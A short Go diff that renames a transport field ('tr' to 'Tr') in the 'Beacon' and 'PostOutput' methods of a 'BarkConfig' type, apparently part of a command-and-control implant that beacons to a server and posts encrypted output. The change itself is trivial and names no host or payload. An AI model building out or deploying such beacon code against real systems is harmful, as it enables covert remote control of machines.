@@ -23,7 +23,7 @@ func (httpconf *BarkConfig) Beacon(url string) ([]byte, error) {
 	request.Header.Set("User-Agent", httpconf.Ua)
 
 	//init client and send request.
-	client := &http.Client{Transport: httpconf.tr}
+	client := &http.Client{Transport: httpconf.Tr}
 	var resp *http.Response
 	resp, err = client.Do(request)
 	if err != nil {
@@ -63,7 +63,7 @@ func (httpconf *BarkConfig) PostOutput(url string, encbytes []byte) ([]byte, err
 	request.Header.Set("User-Agent", httpconf.Ua)
 	var resp *http.Response
 
-	client := &http.Client{Transport: httpconf.tr}
+	client := &http.Client{Transport: httpconf.Tr}
 	resp, err = client.Do(request)
 	if err != nil {
 		return nil, err
